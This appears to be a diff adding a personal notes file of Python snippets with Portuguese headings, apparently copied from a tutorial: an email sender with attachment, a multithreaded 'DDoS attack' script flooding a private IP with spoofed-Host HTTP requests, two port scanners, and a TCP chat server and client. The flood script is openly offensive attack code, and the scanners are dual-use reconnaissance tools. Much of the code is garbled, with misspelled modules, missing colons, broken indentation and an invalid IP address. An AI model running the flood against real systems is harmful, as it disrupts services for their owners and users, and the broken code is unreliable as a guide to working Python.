@@ -1,0 +1,234 @@
+-------------Enviar email ------------
+import smtplib
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.muktipart import MIMEMultipart
+
+server = smptlib.SMTP(`smtp.gmail.com`, 25)
+
+server.ehlo()
+
+#server.login('mail@mail.com', 'passord123')
+
+with open('password.txt', 'r') as f:
+password = f.read()
+
+server.login('mailtesting@neuralnine', password)
+
+msg = MIMEMultipart()
+msg['From'] = 'NeuralNine'
+msg['To'] = 'testmails@spaml.de'
+msg['Subject'] = 'Just A Test'
+
+# criar uma mensagem de texto em um arquivo separada para ser enviad pelo email
+
+with open('mmensagemdetextocriada.text', 'r') as f:
+message = f.read()
+
+msg.attach(MIMEText(message, 'plain'))
+
+filename = 'coding.jpg'
+attachment =  open(filename, 'rb')
+
+p= MIMEBase('application', 'octet - stream')
+p.set_payload(attachment.read())
+
+encoders.encode_base64(p)
+p.add_header('Content-Disposition', 'f`attachment; filename={filename}`)
+msg.attach(p)
+
+text =  msg.as_string()
+server.sendmail('mailtesting@neuralnine.com', 'testmails@spaml.de', text)
+
+
+------------------------------------------------------------
+
+
+ataque dddos
+
+import threading
+import socket
+
+target = " 10.0.0.130"
+port = 80
+
+fake_ip = '192.1680.0.1'
+already_connected = 0
+
+def attack()
+   while True:
+           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+           s.connect((target, port))
+           s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
+           s.sendto(("HoSt: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port)
+           s.close()
+
+           global already_connected
+           already_ connected += 1
+           if already_connected % 500 == 0:
+           print(already_connected)
+
+
+for i in range(500);
+     thread = threading.thread(target=attack)
+     thread.start()   
+
+----------------------
+
+port scanner
+
+import socket
+
+target = '10.0.0.120' #pode ser localhost tb
+
+def portscan(port)
+try:
+ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ sock.connect((target, port))
+ return True
+
+for port in range(1, 1024)
+    result = portscan(port)
+     if result:
+        print("Port {} is open".format(port))
+      else:
+         print("Port {} is closed".format(port))
+--------------------------------------------------
+
+multitread
+
+import socket
+import threading
+form queue import Queue
+
+target = "10.0.0.100'
+queue = Queue()
+open_ports =[]
+
+def portscan(port)
+    try:
+       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       sock.connect((target, port))
+        return True
+    except:
+        return False
+
+def fill_queue(port_list):
+    for port in port_list:
+        queue.port(port)
+
+def worker():
+    while not queue.empty():
+        port = queue.get()
+        if portscan(port):
+             print("Port {} is open!".format(port))
+             open_ports.append(port)
+
+
+port_list = range(1, 1024)
+fill_queue(port_list)
+
+thread_list = []
+
+for t in range(500): # quanto maior o range executa mais rapido 
+    thread = threading.Thread(target=worker)
+    thread_list.append(thread)
+
+for thread in thread_list:
+    thread.start()
+
+for thread in thread_list:
+    thread.join()
+
+print("Open ports are: ", open_ports)
+-----------------------------------------------------------------
+TCP Chating
+
+import threading
+import socket
+
+host = '127.0.0.1'_# localhost
+port = 55555
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(host, port))
+server.listen()
+
+clients= []
+nicknames = []
+
+def broadcast(message):
+    for client in clients:
+        client.send(message)
+
+def handle(client):
+    while True:
+        try:
+            message = client.recv(1024)
+            broadcast(message)
+        except:
+             index = clients.index(client)
+             clients.remove(client)
+             client.close()
+             nickname=nicknames[index]
+             broadcast(f'{nickname} left the chat!'.encode('ascii'))
+             nicknames.remove(nickname)
+             break
+
+def receive():
+    while True:
+          client, address = server.accept()
+          print(f"Connected with {str(address)}")
+          
+            client.send('NICK'.encode('ascii'))
+            nickname= client.recv(1024).decode('ascii')
+            nicknames.append(nickname)
+            clients.append(client)
+
+            print(f'Nickname of the client is {nickname}!')
+            broadcast(f'{nickname} joined the chat!'.encode(ascii'))
+            client.send('Connected to the server!'.encode('ascii'))
+             
+            thread = threading.Thread(target=handle, args=(client,))
+            thread.start()
+
+             print('Server is listening...')
+receive()
+---------------------------
+client chat
+
+import socket
+import threading
+
+nickname = input("Escolha um nickname:")
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(('127.0.0.1', 55555))
+
+def receive():
+     while True:
+          try :
+              message = cliente.recv(1024).decode('ascii')
+              if message == 'Nick':  
+                 client.send(nickname.encode('ascii')
+               else:
+                  print(message)
+
+               except:
+                   print("um erro ocorreu!")
+                   client.close()
+                    break
+
+def write()
+    while True:
+        message = f'{nickname}: {input("")}'    
+        client.send(message.encode('ascii'))
+
+receive_thread = threading.Thread(target=receive)
+receive_thread.start()
+
+write_thread = threading.Thread(target=write)
+write_thread.start()
+
+      
